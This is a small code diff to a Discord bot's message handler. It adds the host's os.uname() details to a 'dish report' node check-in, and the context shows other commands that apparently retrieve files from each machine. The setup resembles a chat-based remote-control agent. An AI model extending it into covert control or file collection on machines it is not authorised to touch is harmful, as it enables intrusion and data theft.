@@ -74,8 +74,11 @@ async def on_message(message):
             await message.channel.send("Error retrieving file: " + filePath)
         return 
 
+    # Report in to the sever, so the user can see what nodes are online 
     if message.content == ("dish report"):
-        reportString = "=========" + "\n" + "ID: " + str(id) + "\n" + "========="
+
+        reportString = "=========" + "\n" + "ID: " + str(id) + "\n" + str(os.uname()) + "\n" + "========="
+
         await message.channel.send(reportString) 
 
 
